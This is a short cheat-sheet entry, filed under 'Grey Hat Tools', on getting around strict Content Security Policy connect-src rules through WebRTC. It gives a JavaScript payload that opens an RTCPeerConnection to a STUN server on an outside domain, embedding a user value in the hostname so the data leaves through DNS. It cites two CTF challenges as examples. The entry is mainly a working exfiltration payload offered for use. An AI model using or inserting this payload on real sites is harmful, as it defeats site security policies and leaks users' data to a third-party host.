---
title: "WebRTC bypass CSP connect-src policies"
description: "
WebRTC

嚴格 CSP，可以透過該方法將資料外傳

例如: default-src 'none'; script-src 'unsafe-inline';




async function a(){
    c={iceServers:[{urls:\"stun:{{user.id}}.x.cjxol.com:1337\"}]}
    (p=new RTCPeerConnection(c)).createDataChannel(\"d\")
    await p.setLocalDescription()
}
a();

Example

SeikaiCTF 2023 - Golf Jail
corCTF 2023 - crabspace



"
url: "https://github.com/w3c/webrtc-nv-use-cases/issues/35"
category: "Grey Hat Tools"
---
